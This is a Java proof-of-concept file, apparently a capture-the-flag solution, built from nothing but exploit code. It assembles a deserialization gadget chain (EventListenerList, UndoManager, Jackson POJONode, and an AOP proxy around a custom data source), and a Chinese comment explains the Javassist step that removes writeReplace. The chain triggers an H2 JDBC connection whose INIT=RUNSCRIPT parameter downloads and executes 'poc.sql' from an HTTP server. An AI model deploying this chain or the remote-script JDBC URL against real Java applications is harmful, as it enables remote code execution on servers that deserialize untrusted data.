package solution;

import challenge.MyDataSource;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.util.Vector;

public class Poc {
    public static void main(String[] args) throws Exception {
        Tools17 tools17 = new Tools17();
        Tools17.bypassModule(Poc.class);
        Tools17.bypassModule(readObject_toString.class);

        MyDataSource myDataSource = new MyDataSource("jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'", "1diOt9", "123456");

        Person person = new Person();


        // 删除 BaseJsonNode#writeReplace 方法用于顺利序列化
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
//        ctClass0.toClass();

        POJONode node = new POJONode(Tools17.makeTemplatesImplAopProxy(myDataSource));

        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) tools17.getFieldValue(manager, "edits");
        vector.add(node);
        tools17.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});

        byte[] ser = Tools17.ser(list);
        Tools17.deser(ser);

    }
}
